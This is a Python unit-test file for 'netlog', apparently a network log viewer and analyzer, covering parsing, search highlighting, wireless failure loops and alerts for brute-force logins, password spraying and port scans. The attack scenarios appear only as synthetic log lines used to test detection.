#!/usr/bin/env python3
"""Unit tests for the pure, curses-free pieces of netlog.

Run with:  python3 -m unittest discover -s tests -v
"""
import contextlib
import io
import sys
import importlib.machinery
import importlib.util
import unittest
import unittest.mock
from pathlib import Path

# netlog has no .py extension, so load it explicitly by path.
_NETLOG_PATH = Path(__file__).resolve().parent.parent / 'netlog'
_loader = importlib.machinery.SourceFileLoader('netlog', str(_NETLOG_PATH))
_spec = importlib.util.spec_from_loader('netlog', _loader)
netlog = importlib.util.module_from_spec(_spec)
sys.modules['netlog'] = netlog
_loader.exec_module(netlog)


class DedupLinesTest(unittest.TestCase):
    def test_empty(self):
        self.assertEqual(netlog.dedup_lines([]), [])

    def test_no_duplicates(self):
        self.assertEqual(netlog.dedup_lines(['a', 'b', 'c']),
                          [('a', 1), ('b', 1), ('c', 1)])

    def test_consecutive_duplicates_collapsed(self):
        self.assertEqual(netlog.dedup_lines(['a', 'a', 'b', 'b', 'b', 'a']),
                          [('a', 2), ('b', 3), ('a', 1)])

    def test_non_consecutive_duplicates_not_merged(self):
        self.assertEqual(netlog.dedup_lines(['a', 'b', 'a']),
                          [('a', 1), ('b', 1), ('a', 1)])


class StripColsTest(unittest.TestCase):
    def test_zero_columns_is_noop(self):
        self.assertEqual(netlog._strip_cols('a b c', 0), 'a b c')

    def test_strip_one_column(self):
        self.assertEqual(netlog._strip_cols('Jan 1 host: msg', 1), '1 host: msg')

    def test_strip_more_columns_than_exist(self):
        self.assertEqual(netlog._strip_cols('a b', 5), '')

    def test_comma_and_tab_are_delimiters(self):
        self.assertEqual(netlog._strip_cols('a,b\tc', 2), 'c')


class FindMatchesTest(unittest.TestCase):
    def setUp(self):
        self.view = [('hello world', 1), ('foo bar', 1), ('WORLD peace', 1)]

    def test_plain_text_is_case_insensitive(self):
        self.assertEqual(netlog.find_matches(self.view, 'world'), [0, 2])

    def test_regex_mode(self):
        self.assertEqual(netlog.find_matches(self.view, r'^foo', regex=True), [1])

    def test_invalid_regex_yields_no_matches_not_an_exception(self):
        self.assertEqual(netlog.find_matches(self.view, '(', regex=True), [])


class NextMatchTest(unittest.TestCase):
    view = [('a', 1), ('hit', 1), ('b', 1), ('HIT', 1), ('c', 1)]

    def test_forward_backward_and_wrap(self):
        for matches in (None, [1, 3]):           # scanning (large file) and precomputed
            with self.subTest(precomputed=matches is not None):
                nm = lambda start, step: netlog.next_match(self.view, 'hit', False, start,
                                                           step, matches)
                self.assertEqual(nm(0, 1), (1, False))
                self.assertEqual(nm(2, 1), (3, False))
                self.assertEqual(nm(4, 1), (1, True))
                self.assertEqual(nm(2, -1), (1, False))
                self.assertEqual(nm(0, -1), (3, True))

    def test_no_match(self):
        self.assertEqual(netlog.next_match(self.view, 'zzz', False, 0), (None, False))
        self.assertEqual(netlog.next_match(self.view, 'zzz', False, 0, 1, []), (None, False))
        self.assertEqual(netlog.next_match(self.view, '(', True, 0), (None, False))


class SearchHighlightTest(unittest.TestCase):
    LINE = 'kernel: DROP IN=eth0 SRC=10.0.0.5 DST=1.1.1.1 error port 22 from'

    def _hits(self, term, regex=False):
        segs = netlog._collect_segments(self.LINE, {}, {}, [0], term, regex)
        return [self.LINE[s:e] for s, e, _d, _a, pair, _b, _g in segs if pair == netlog._P_SRCH]

    def test_hits_inside_colored_tokens_are_highlighted(self):
        # IPs, interfaces, severities and ports are colored tokens; a search
        # for them used to be silently dropped.
        self.assertEqual(self._hits('10.0.0.5'), ['10.0.0.5'])
        self.assertEqual(self._hits('0.0.5'), ['10.0.0.5'])
        self.assertEqual(self._hits('ETH0'), ['eth0'])
        self.assertEqual(self._hits('error'), ['error'])

    def test_hit_spanning_token_and_plain_text(self):
        self.assertEqual(self._hits('22 from'), ['port 22', ' from'])

    def test_plain_hit_and_no_hit(self):
        self.assertEqual(self._hits('drop'), ['DROP'])
        self.assertEqual(self._hits('zzz'), [])
        self.assertEqual(self._hits(r'\d+\.\d+\.1\.1', regex=True), ['1.1.1.1'])


class EventTypeTest(unittest.TestCase):
    def test_deny_outranks_error(self):
        result = netlog._event_type('connection denied due to failed auth')
        self.assertEqual(result[0], '✗ ')   # ✗

    def test_allow(self):
        result = netlog._event_type('permit tcp any any')
        self.assertEqual(result[0], '✓ ')   # ✓

    def test_no_match_returns_none(self):
        self.assertIsNone(netlog._event_type('just some ordinary log text'))


class FileBaseTest(unittest.TestCase):
    def test_strips_from_first_dot(self):
        self.assertEqual(netlog._file_base('firewall.log.10.gz'), 'firewall')

    def test_no_dot_returns_whole_name(self):
        self.assertEqual(netlog._file_base('syslog'), 'syslog')

    def test_uses_basename_not_full_path(self):
        self.assertEqual(netlog._file_base('/var/log/firewall.log'), 'firewall')


class CollectSegmentsTest(unittest.TestCase):
    def setUp(self):
        self.vendors = {}
        self.mac_map = {}
        self.ctr = [0]

    def test_no_two_segments_overlap(self):
        line = '00:11:22:33:44:55 talked to 10.0.0.1 on port 443'
        segs = netlog._collect_segments(line, self.vendors, self.mac_map, self.ctr)
        spans = [(s, e) for s, e, *_ in segs]
        for i, (s1, e1) in enumerate(spans):
            for s2, e2 in spans[i + 1:]:
                self.assertFalse(s1 < e2 and s2 < e1, f'{spans[i]} overlaps {(s2, e2)}')

    def test_well_known_port_name_shown(self):
        segs = netlog._collect_segments('dport=443', self.vendors, self.mac_map, self.ctr)
        disp = [d for _, _, d, *_ in segs]
        self.assertTrue(any('HTTPS' in d for d in disp))

    def test_search_term_does_not_duplicate_higher_priority_match(self):
        segs = netlog._collect_segments('10.0.0.1 error', self.vendors, self.mac_map,
                                         self.ctr, search_term='10.0.0.1')
        ip_hits = [s for s in segs if s[2] == '10.0.0.1']
        self.assertEqual(len(ip_hits), 1)


class ParseArgsTest(unittest.TestCase):
    def test_plain_file(self):
        follow, n, files, alert, egrep, setup = netlog.parse_args(['somefile.log'])
        self.assertFalse(follow)
        self.assertEqual(n, 10)
        self.assertEqual(files, [Path('somefile.log')])
        self.assertIsNone(alert)
        self.assertIsNone(egrep)
        self.assertFalse(setup)

    def test_follow_with_egrep_pattern_and_tail_count(self):
        follow, n, files, alert, egrep, setup = netlog.parse_args(
            ['-f', '-n', '50', 'deny|drop', 'firewall.log'])
        self.assertTrue(follow)
        self.assertEqual(n, 50)
        self.assertEqual(egrep, 'deny|drop')
        self.assertEqual(files, [Path('firewall.log')])

    def test_follow_single_file_has_no_egrep_pattern(self):
        follow, n, files, alert, egrep, setup = netlog.parse_args(['-f', 'firewall.log'])
        self.assertIsNone(egrep)
        self.assertEqual(files, [Path('firewall.log')])

    def test_alert_flag(self):
        *_, alert, egrep, setup = netlog.parse_args(['-f', '--alert', 'DENY', 'x.log'])
        self.assertEqual(alert, 'DENY')

    def test_setup_geoip_flag(self):
        *_, setup = netlog.parse_args(['--setup-geoip'])
        self.assertTrue(setup)

    def test_bad_n_value_raises_cleanly(self):
        with self.assertRaises(SystemExit), contextlib.redirect_stderr(io.StringIO()):
            netlog.parse_args(['-n', 'not-a-number', 'x.log'])


# ── Structured analysis ──────────────────────────────────────────────────────

def _ev(name, mac='f4:f5:d8:de:73:50', t='08:00:00', **kv):
    """Build a controller-style log line."""
    fields = ' '.join(f'{k}="{v}"' for k, v in kv.items())
    return f'May  1 {t} ctrl1 wlc: {name} clientMac="{mac}" {fields}'.rstrip()


def _report(lines, **rules):
    an = netlog.Analyzer(rules=netlog.Rules(**rules), keep_raw=True)
    for line in lines:
        an.feed(line)
    return netlog.Report(an)


class ParseEventTest(unittest.TestCase):
    def test_quoted_and_unquoted_fields_with_aliases(self):
        p = netlog.parse_event('clientJoin apName="AP 1" client_mac=F4-F5-D8-DE-73-50, '
                               "ssid='Staff' rssi=-70")
        self.assertEqual(p.name, 'clientJoin')
        self.assertEqual(p.kind, 'join')
        self.assertEqual(p.fields['ap_name'], 'AP 1')
        self.assertEqual(p.fields['client_mac'], 'f4:f5:d8:de:73:50')
        self.assertEqual(p.fields['ssid'], 'Staff')
        self.assertEqual(p.fields['rssi'], '-70')

    def test_event_field_wins_over_camel_case_text(self):
        p = netlog.parse_event('someOtherWord event="clientRoaming" clientMac="aa:bb:cc:dd:ee:ff"')
        self.assertEqual(p.name, 'clientRoaming')
        self.assertEqual(p.kind, 'roam')

    def test_numeric_event_code_is_not_a_name(self):
        # Real router line: event=156 is a code, and there's no client field.
        self.assertIsNone(netlog.parse_event(
            'bsd: BSS Transit Response: ifname=eth5, event=156, token=33, status=4'))

    def test_plain_lines_are_not_events(self):
        self.assertIsNone(netlog.parse_event('sshd[1]: Accepted publickey for root'))
        self.assertIsNone(netlog.parse_event('dnsmasq[7]: started, version 2.90 cachesize 150'))
        self.assertIsNone(netlog.parse_event('systemd[1]: Started Session 4 of user root.'))

    def test_invalid_mac_field_is_dropped(self):
        p = netlog.parse_event('clientJoin clientMac="not-a-mac" userName="bob"')
        self.assertNotIn('client_mac', p.fields)
        self.assertEqual(p.fields['user'], 'bob')

    def test_kind_classification(self):
        cases = {
            'clientJoinFailure': 'failure', 'authTimeout': 'failure',
            'clientDisconnect': 'disconnect', 'clientDeauth': 'disconnect',
            'clientIdleTimeout': 'disconnect', 'clientAuthorization': 'auth',
            'clientRoaming': 'roam', 'clientAssociation': 'join', 'clientJoin': 'join',
        }
        for name, kind in cases.items():
            with self.subTest(name=name):
                self.assertEqual(netlog.parse_event(f'{name} userName="x"').kind, kind)

    def test_failed_status_makes_any_event_a_failure(self):
        p = netlog.parse_event('clientAuthorization userName="x" result="failure"')
        self.assertEqual(p.kind, 'failure')
        self.assertEqual(netlog.failure_label(p.name, p.fields),
                         'clientAuthorization (failure)')


class TimestampTest(unittest.TestCase):
    def test_iso_with_zone(self):
        self.assertEqual(netlog.parse_timestamp('2024-05-01T08:00:00Z host x'), 1714550400)
        self.assertEqual(netlog.parse_timestamp('2024-05-01T10:00:00+02:00 x'), 1714550400)

    def test_bsd_syslog(self):
        a = netlog.parse_timestamp('May  1 08:00:00 host x')
        b = netlog.parse_timestamp('May  1 08:05:30 host x')
        self.assertEqual(b - a, 330)

    def test_epoch_field_fallback(self):
        p = netlog.parse_event('clientJoin userName="x" timestamp=1714550400000')
        self.assertEqual(p.ts, 1714550400)

    def test_no_timestamp(self):
        self.assertIsNone(netlog.parse_timestamp('clientJoin userName="x"'))


class NormalizeTest(unittest.TestCase):
    def test_mac_notations(self):
        for s in ('F4:F5:D8:DE:73:50', 'f4-f5-d8-de-73-50', 'f4f5.d8de.7350', 'f4f5d8de7350'):
            self.assertEqual(netlog.norm_mac(s), 'f4:f5:d8:de:73:50')
        self.assertIsNone(netlog.norm_mac('alice'))
        self.assertIsNone(netlog.norm_mac('f4:f5:d8:de:73'))

    def test_user_formats(self):
        for u in ('alice', 'Alice@corp.org', 'CORP\\alice'):
            self.assertEqual(netlog.norm_user(u), 'alice')


class SeverityTest(unittest.TestCase):
    def test_tiers(self):
        sev = lambda line: netlog.event_severity(netlog.parse_event(line), netlog.Rules())
        self.assertEqual(sev(_ev('clientJoinFailure', ssid='Staff-old')), 'error')
        self.assertEqual(sev(_ev('clientJoin', ssid='Staff-old')), 'warning')
        self.assertEqual(sev(_ev('clientJoin', rssi='-82')), 'warning')
        self.assertEqual(sev(_ev('clientJoin', rssi='-60', ssid='Staff')), 'success')
        self.assertEqual(sev(_ev('clientRoaming')), 'info')

    def test_structured_glyph_used_for_camel_case_failures(self):
        # The keyword table needs whole words, so it would miss this.
        self.assertEqual(netlog._event_type(_ev('clientJoinFailure'))[0], '✗ ')
        self.assertEqual(netlog._event_type(_ev('clientRoaming'))[0], '↔ ')


class FailureLoopTest(unittest.TestCase):
    def test_loop_with_recovery(self):
        rep = _report([_ev('clientJoinFailure', t='08:00:00', apName='AP1'),
                       _ev('clientJoinFailure', t='08:01:00', apName='AP1'),
                       _ev('clientJoinFailure', t='08:02:00', apName='AP1'),
                       _ev('clientJoin',        t='08:03:00', apName='AP1')])
        self.assertEqual(len(rep.loops), 1)
        lp = rep.loops[0]
        self.assertEqual(lp.count, 3)
        self.assertEqual(lp.end - lp.start, 120)
        self.assertEqual(lp.recovery.name, 'clientJoin')
        self.assertEqual(lp.aps['AP1'], 3)

    def test_failures_spread_beyond_window_are_not_a_loop(self):
        rep = _report([_ev('clientJoinFailure', t='08:00:00'),
                       _ev('clientJoinFailure', t='08:04:00'),
                       _ev('clientJoinFailure', t='08:08:00')], loop_window=300)
        self.assertEqual(rep.loops, [])

    def test_success_resets_the_run(self):
        rep = _report([_ev('clientJoinFailure', t='08:00:00'),
                       _ev('clientJoinFailure', t='08:00:10'),
                       _ev('clientJoin',        t='08:00:20'),
                       _ev('clientJoinFailure', t='08:00:30')])
        self.assertEqual(rep.loops, [])

    def test_threshold_is_configurable(self):
        lines = [_ev('clientJoinFailure', t='08:00:00'), _ev('clientJoinFailure', t='08:00:10')]
        self.assertEqual(len(_report(lines, loop_threshold=2).loops), 1)

    def test_untimed_logs_count_consecutive_failures(self):
        line = 'clientJoinFailure clientMac="aa:aa:aa:aa:aa:aa"'
        rep  = _report([line] * 3)
        self.assertEqual(len(rep.loops), 1)
        self.assertFalse(rep.loops[0].timed)


class ReportFindingsTest(unittest.TestCase):
    def findings(self, rep, mac='f4:f5:d8:de:73:50'):
        return [(c, t) for c, t in rep.clients[mac].findings]

    def test_username_format_inconsistency(self):
        rep = _report([_ev('clientJoin', userName='bob'),
                       _ev('clientAuthorization', userName='bob@corp.org')])
        self.assertIn(('identity', 'username format varies: bob vs bob@corp.org'),
                      self.findings(rep))

    def test_different_users_on_one_device(self):
        rep = _report([_ev('clientJoin', userName='bob'), _ev('clientJoin', userName='eve')])
        cats = [t for c, t in self.findings(rep) if c == 'identity']
        self.assertEqual(cats, ['multiple users on one device: bob, eve'])

    def test_legacy_ssid_and_low_rssi(self):
        rep  = _report([_ev('clientJoinFailure', ssid='WCSDaccess-old'),
                        _ev('clientJoin', ssid='WCSDaccess', rssi='-80')])
        cats = dict(self.findings(rep))
        self.assertIn('WCSDaccess-old', cats['legacy'])
        self.assertIn('1 failed', cats['legacy'])
        self.assertIn('-80', cats['rssi'])

    def test_rapid_roaming(self):
        rep = _report([_ev('clientRoaming', t='08:00:00'), _ev('clientRoaming', t='08:00:20'),
                       _ev('clientRoaming', t='08:00:40')])
        self.assertIn('roam', dict(self.findings(rep)))
        slow = _report([_ev('clientRoaming', t='08:00:00'), _ev('clientRoaming', t='08:05:00'),
                        _ev('clientRoaming', t='08:10:00')])
        self.assertNotIn('roam', dict(self.findings(slow)))

    def test_ap_hotspot_flag_and_location_inheritance(self):
        lines = []
        for i in range(10):     # healthy AP: 10 joins, 1 failure
            lines.append(_ev('clientJoin', mac=f'00:00:00:00:00:{i:02x}', apName='AP-OK',
                             apLocation='Office'))
        lines.append(_ev('clientJoinFailure', mac='00:00:00:00:00:01', apName='AP-OK'))
        lines.append(_ev('clientJoin', mac='00:00:00:00:01:00', apName='AP-BAD',
                         apLocation='Gym'))
        for i in range(4):      # bad AP: 4 failures, location only on the join above
            lines.append(_ev('clientJoinFailure', mac=f'00:00:00:00:02:{i:02x}',
                             apName='AP-BAD'))
        rep = _report(lines)
        self.assertTrue(rep.aps['AP-BAD'].flagged)
        self.assertFalse(rep.aps['AP-OK'].flagged)
        self.assertEqual(rep.locations['Gym'].failures, 4)
        self.assertTrue(rep.locations['Gym'].flagged)

    def test_session_path(self):
        rep = _report([_ev('clientJoinFailure', t='08:00:00'), _ev('clientJoinFailure', t='08:00:10'),
                       _ev('clientJoinFailure', t='08:00:20'), _ev('clientJoin', t='08:00:30'),
                       _ev('clientAuthorization', t='08:00:31'), _ev('clientRoaming', t='08:10:00')])
        cs = rep.clients['f4:f5:d8:de:73:50']
        self.assertEqual(netlog.session_path(cs.events, cs.loops),
                         'Join Failure ×3 (retry loop) → Join → Authorization → Roaming')


class FormatTest(unittest.TestCase):
    LINES = [_ev('clientJoinFailure', t='08:00:00', userName='alice', apName='AP1'),
             _ev('clientJoinFailure', t='08:00:10', userName='alice', apName='AP1'),
             _ev('clientJoinFailure', t='08:00:20', userName='alice', apName='AP1'),
             _ev('clientJoin', t='08:00:30', userName='alice@corp.org', apName='AP1')]

    def test_summary_sections(self):
        text = netlog.format_summary(_report(self.LINES), {}, color=False)
        for heading in ('Failures by event type', 'Top failing clients', 'Top failing users',
                        'Access points by failure rate', 'Findings', 'Wireless failure loop',
                        'Identity inconsistency'):
            self.assertIn(heading, text)
        self.assertNotIn('\033[', text)

    def test_summary_with_no_structured_events(self):
        an = netlog.Analyzer()
        an.feed('sshd[1]: hello')
        self.assertIn('No recognised events', netlog.format_summary(netlog.Report(an), {}))

    def test_timeline_by_user_groups_loop(self):
        text, found = netlog.format_timeline(_report(self.LINES), 'ALICE', {}, color=False)
        self.assertTrue(found)
        self.assertIn('┏━ ⚠ FAILURE LOOP: 3 failures in 20s @ AP1', text)
        self.assertEqual(text.count('┃ '), 3)
        self.assertIn('┗━ recovered via clientJoin', text)

    def test_timeline_unknown_client(self):
        text, found = netlog.format_timeline(_report(self.LINES), 'nobody', {})
        self.assertFalse(found)


class LiveCorrelatorTest(unittest.TestCase):
    def test_banner_on_threshold_and_recovery(self):
        corr = netlog.LiveCorrelator({}, [0], rules=netlog.Rules(), color=False)
        out  = [corr.process(_ev('clientJoinFailure', t=f'08:00:0{i}')) for i in range(3)]
        self.assertEqual(out[0], ([], '', ''))
        self.assertEqual(out[1], ([], '', ''))
        before, gutter, _ = out[2]
        self.assertEqual(len(before), 1)
        self.assertIn('FAILURE LOOP', before[0])
        self.assertEqual(gutter, '┃ ')
        before, gutter, suffix = corr.process(_ev('clientJoin', t='08:00:09'))
        self.assertEqual(gutter, '┗━')
        self.assertIn('recovered after 3 failures', suffix)

    def test_quiet_window_closes_loop(self):
        corr = netlog.LiveCorrelator({}, [0], rules=netlog.Rules(), color=False)
        for i in range(3):
            corr.process(_ev('clientJoinFailure', t=f'08:00:0{i}'))
        before, gutter, _ = corr.process(_ev('clientRoaming', t='08:30:00'))
        self.assertIn('loop ended', before[0])
        self.assertEqual(gutter, '')

    def test_other_clients_are_not_decorated(self):
        corr = netlog.LiveCorrelator({}, [0], rules=netlog.Rules(), color=False)
        for i in range(3):
            corr.process(_ev('clientJoinFailure', t=f'08:00:0{i}'))
        self.assertEqual(corr.process(_ev('clientJoin', mac='11:11:11:11:11:11')), ([], '', ''))


# ── Vendor formats ───────────────────────────────────────────────────────────

_T = 'May  1 09:{:02d}:{:02d}'


def _cisco_link(i, state):
    return (f'{_T.format(i // 60, i % 60)} sw1 %LINK-3-UPDOWN: '
            f'Interface GigabitEthernet1/0/24, changed state to {state}')


def _login(i, ok=False):
    t = _T.format(8 + i // 60, i % 60)
    if ok:
        return (f'{t} sw1 %SEC_LOGIN-5-LOGIN_SUCCESS: Login Success [user: admin] '
                f'[Source: 198.51.100.7] [localport: 22]')
    return (f'{t} sw1 %SEC_LOGIN-4-LOGIN_FAILED: Login failed [user: admin] '
            f'[Source: 198.51.100.7] [localport: 22] [Reason: Login Authentication Failed]')


def _fgt_deny(port):
    return (f'date=2024-05-01 time=09:10:{port % 60:02d} devname="FGT60F" logid="0000000013" '
            f'type="traffic" subtype="forward" level="notice" srcip=203.0.113.66 '
            f'srcport=40000 srcintf="wan1" dstip=10.0.0.10 dstport={port} '
            f'dstintf="internal" proto=6 action="deny" policyid=0')


class VendorFormatTest(unittest.TestCase):
    def setUp(self):
        netlog.parse_event.cache_clear()

    def test_every_documented_example(self):
        n = 0
        for fmt, line, kind, fields in netlog.format_examples():
            with self.subTest(fmt=fmt.id, line=line[:60]):
                netlog._LAST_FMT[0] = None
                p = netlog._parse_event(line)
                self.assertIsNotNone(p)
                self.assertEqual(p.fmt, fmt.id)
                self.assertEqual(p.kind, kind)
                for k, v in fields.items():
                    self.assertEqual(p.fields.get(k), v, k)
            n += 1
        self.assertGreaterEqual(n, len(netlog.FORMATS))

    def test_detection_does_not_stick_to_previous_format(self):
        lines = list(netlog.format_examples())
        for fmt, line, kind, _ in lines + lines[::-1]:
            with self.subTest(fmt=fmt.id):
                self.assertEqual(netlog._parse_event(line).fmt, fmt.id)

    def test_format_ids_unique_and_listed(self):
        ids = [f.id for f in netlog.FORMATS]
        self.assertEqual(len(ids), len(set(ids)))
        text = netlog.format_list(color=False)
        for f in netlog.FORMATS:
            self.assertIn(f.product, text)

    def test_classify_text(self):
        cases = [
            (('LINK-3-UPDOWN', 'Interface Gi1/0/1, changed state to down'), 'link_down'),
            (('LINK-3-UPDOWN', 'Interface Gi1/0/1, changed state to up'), 'link_up'),
            (('PM-4-ERR_DISABLE', 'bpduguard error detected on Gi1/0/7'), 'err_disable'),
        ]
        for args, kind in cases:
            with self.subTest(args=args):
                self.assertEqual(netlog.classify_text(*args), kind)

    def test_syslog_header(self):
        self.assertEqual(netlog.syslog_header('<134>May  1 09:00:00 sw1 %LINK-3-UPDOWN: x'),
                         (6, 'sw1'))
        self.assertEqual(netlog.syslog_header('no header here'), (None, None))

    def test_vendor_severity_and_host(self):
        p = netlog.parse_event(_cisco_link(0, 'down'))
        self.assertEqual((p.fmt, p.kind, p.fields['host']), ('cisco', 'link_down', 'sw1'))
        self.assertEqual(netlog.event_severity(p, netlog.Rules(), ()), 'warning')


class NetworkFindingsTest(unittest.TestCase):
    @staticmethod
    def _cats(rep):
        return {(c, subj): text for c, _sev, subj, text in rep.findings}

    def test_interface_flapping(self):
        lines = []
        for i in range(4):
            lines += [_cisco_link(i * 20, 'down'), _cisco_link(i * 20 + 10, 'up')]
        found = self._cats(_report(lines))
        self.assertIn(('flap', 'sw1 GigabitEthernet1/0/24'), found)
        self.assertIn('4 link downs', found[('flap', 'sw1 GigabitEthernet1/0/24')])

    def test_thresholds_are_configurable(self):
        flaps = [_cisco_link(0, 'down'), _cisco_link(5, 'up'),
                 _cisco_link(10, 'down'), _cisco_link(15, 'up')]
        self.assertIn('flap', {f[0] for f in _report(flaps, flap_threshold=2).findings})
        logins = [_login(i * 5) for i in range(6)]
        self.assertNotIn('brute', {f[0] for f in _report(logins, brute_threshold=7).findings})
        denies = [_fgt_deny(p) for p in range(20, 45)]
        self.assertNotIn('scan', {f[0] for f in _report(denies, scan_ports=30).findings})

    def test_two_flaps_are_not_flapping(self):
        lines = [_cisco_link(0, 'down'), _cisco_link(5, 'up'),
                 _cisco_link(10, 'down'), _cisco_link(15, 'up')]
        self.assertFalse([f for f in _report(lines).findings if f[0] == 'flap'])

    def test_brute_force_then_success(self):
        rep   = _report([_login(i * 5) for i in range(6)] + [_login(40, ok=True)])
        texts = [t for c, _s, subj, t in rep.findings if c == 'brute' and subj == '198.51.100.7']
        self.assertTrue(any('6 login failures' in t for t in texts), texts)
        self.assertTrue(any('successful login as admin after 6 failures' in t for t in texts),
                        texts)

    def test_port_scan(self):
        rep = _report([_fgt_deny(p) for p in range(20, 45)])
        found = self._cats(rep)
        self.assertIn(('scan', '203.0.113.66'), found)
        self.assertIn('25 distinct ports', found[('scan', '203.0.113.66')])

    def test_err_disable_and_neighbor(self):
        rep = _report([
            'May  1 09:00:00 sw1 %PM-4-ERR_DISABLE: bpduguard error detected on Gi1/0/7, '
            'putting Gi1/0/7 in err-disable state',
            'May  1 09:05:10 rtr1 %OSPF-5-ADJCHG: Process 1, Nbr 10.0.0.2 on Gi0/0 from '
            'FULL to DOWN, Neighbor Down: Dead timer expired'])
        found = self._cats(rep)
        self.assertIn(('errdisable', 'sw1 Gi1/0/7'), found)
        self.assertIn('currently down', found[('routing', 'rtr1 → 10.0.0.2')])

    def test_summary_sections(self):
        lines = ([_cisco_link(i * 20, 'down') for i in range(4)] +
                 [_login(i * 5) for i in range(6)] + [_fgt_deny(p) for p in range(20, 45)])
        text = netlog.format_summary(_report(lines), {}, color=False)
        for heading in ('SWITCHING & ROUTING', 'FIREWALL & SECURITY',
                        'AUTHENTICATION & ADMINISTRATION', 'Devices'):
            self.assertIn(heading, text)



def _hms(sec):
    h, r = divmod(int(sec), 3600)
    m, s = divmod(r, 60)
    return f'May  1 {h:02d}:{m:02d}:{s:02d}'


def _ufw(src, dst, dpt, action='ALLOW', t=8 * 3600):
    return (f'{_hms(t)} fw1 kernel: [UFW {action}] IN=eth0 OUT=eth1 SRC={src} DST={dst} '
            f'LEN=60 PROTO=TCP SPT=51515 DPT={dpt}')


class AlertsTest(unittest.TestCase):
    def setUp(self):
        netlog.parse_event.cache_clear()

    @staticmethod
    def _alerts(lines, **rules):
        return netlog.collect_alerts(_report(lines, **rules))

    def _titles(self, lines, **rules):
        return {(a.title, a.subject): a for a in self._alerts(lines, **rules)}

    def test_password_spraying_and_distributed_attack(self):
        lines = [f'{_hms(9 * 3600 + i)} srv1 sshd[1]: Failed password for invalid user {u} '
                 f'from 198.51.100.50 port 5000 ssh2'
                 for i, u in enumerate(['a', 'b', 'c', 'd', 'e', 'f'])]
        lines += [f'{_hms(9 * 3600 + 100 + i * 60)} srv1 sshd[1]: Failed password for root '
                  f'from 203.0.113.{i} port 5000 ssh2' for i in range(5)]
        got = self._titles(lines)
        self.assertIn(('Password spraying', '198.51.100.50'), got)
        self.assertIn(('Distributed login attack', 'account root'), got)
        got = self._titles(lines, spray_accounts=7, spray_sources=6)
        self.assertNotIn(('Password spraying', '198.51.100.50'), got)
        self.assertNotIn(('Distributed login attack', 'account root'), got)
        got = self._titles(lines, spray_accounts=3, brute_threshold=20)
        self.assertIn(('Password spraying', '198.51.100.50'), got)

    def test_sshd_success_after_brute_force_is_critical(self):
        lines = [f'{_hms(9 * 3600 + i)} srv1 sshd[1]: Failed password for root from '
                 f'198.51.100.9 port 5000 ssh2' for i in range(6)]
        lines.append(f'{_hms(9 * 3600 + 20)} srv1 sshd[1]: Accepted password for root from '
                     f'198.51.100.9 port 5000 ssh2')
        a = self._titles(lines)[('Login succeeded after brute force', '198.51.100.9')]
        self.assertEqual(netlog.LEVELS[a.level], 'critical')

    def test_firewall_exposure(self):
        lines  = [_ufw(f'185.220.101.{i}', '10.0.0.20', 3389) for i in range(3)]
        lines += [_ufw('10.0.0.66', f'45.33.{i}.7', 445, 'BLOCK') for i in range(4)]
        lines += [_ufw('10.0.0.77', f'64.{i}.10.25', 25) for i in range(12)]
        lines += [_ufw('203.0.113.5', '10.0.0.20', 3389)]     # documentation range: public
        got = self._titles(lines)
        a = got[('Risky service allowed from internet', '10.0.0.20:3389 (RDP)')]
        self.assertEqual(a.level, 0)
        self.assertIn('4 internet sources', a.detail)
        self.assertIn(('Internal host using risky service on internet', '10.0.0.66'), got)
        self.assertIn(('Possible spam bot', '10.0.0.77'), got)

    def test_ip_scope(self):
        self.assertEqual(netlog.ip_scope('10.1.2.3'), 'private')
        self.assertEqual(netlog.ip_scope('100.64.0.1'), 'private')
        self.assertEqual(netlog.ip_scope('203.0.113.5'), 'public')
        self.assertEqual(netlog.ip_scope('8.8.8.8'), 'public')
        self.assertEqual(netlog.ip_scope('fe80::1'), 'private')
        self.assertIsNone(netlog.ip_scope('not-an-ip'))

    def test_text_detectors(self):
        cases = {
            'dhcpd[4]: DHCPDISCOVER from aa:bb:cc:00:11:22 via eth1: no free leases': 'dhcp',
            'kernel: nf_conntrack: table full, dropping packet': 'table',
            'kernel: Out of memory: Killed process 42 (java)': 'memory',
            'kernel: arp: 10.0.0.1 moved from aa:bb:cc:dd:ee:01 to 11:22:33:44:55:66': 'arp',
            'wlc: Rogue AP detected on channel 6': 'rogue',
            'nginx[3]: segfault at 0 ip 00007f error 4': 'crash',
            'postgres[1]: could not write: No space left on device': 'disk',
            'nginx[3]: SSL_do_handshake() failed: certificate has expired': 'cert',
            'ntpd[3]: no servers can be used, system clock unsynchronized': 'ntp',
            'charon: IKE_SA t1 negotiation failed: no proposal chosen': 'vpntext',
            'kernel: IPv4: martian source 10.0.0.1 from 1.2.3.4': 'spoof',
            'sw1: Broadcast storm detected on port 3': 'storm',
            'systemd[1]: Started Session 4 of user root.': None,
            'dnsmasq[7]: query[A] example.com from 10.0.0.5': None,
        }
        for text, want in cases.items():
            with self.subTest(text=text):
                self.assertEqual(netlog.text_issue(text), want)

    def test_text_issue_becomes_alert(self):
        got = self._titles([f'{_hms(8 * 3600)} gw kernel: nf_conntrack: table full, dropping packet'])
        self.assertIn(('Session / conntrack table full', 'gw'), got)

    def test_error_spike(self):
        lines = [f'{_hms(8 * 3600 + i * 60)} sw1 %SYS-6-LOGGINGHOST_STARTSTOP: Logging to host'
                 f' 10.0.0.1 started' for i in range(120)]
        lines += [f'{_hms(9 * 3600 + i * 5)} sw1 %LINK-3-UPDOWN: Interface Gi1/0/{i % 40 + 1},'
                  f' changed state to down' for i in range(60)]
        lines.sort(key=lambda l: l[:15])
        spikes = [a for a in self._alerts(lines) if a.title == 'Spike in errors / warnings']
        self.assertEqual(len(spikes), 1)
        self.assertIn('09:00:00', spikes[0].subject)
        self.assertIn('per 5m)', spikes[0].detail)
        self.assertFalse([a for a in self._alerts(lines, spike_min=61)
                          if a.title == 'Spike in errors / warnings'])
        spikes = [a for a in self._alerts(lines, spike_window=60, spike_min=10)
                  if a.title == 'Spike in errors / warnings']
        self.assertEqual(len(spikes), 1)
        self.assertIn('per 1m)', spikes[0].detail)
        # With a non-zero baseline, the factor decides.
        noisy = lines + [f'{_hms(8 * 3600 + i * 60 + 1)} sw1 %LINK-3-UPDOWN: Interface Gi1/0/48,'
                         f' changed state to down' for i in range(120) if i % 5 == 0]
        noisy.sort(key=lambda l: l[:15])
        for factor, want in ((5, 1), (100, 0)):
            with self.subTest(factor=factor):
                got = [a for a in self._alerts(noisy, spike_factor=factor)
                       if a.title == 'Spike in errors / warnings']
                self.assertEqual(len(got), want)

    def test_device_stopped_logging_and_clock_mismatch(self):
        lines = []
        for i in range(0, 4 * 3600, 60):
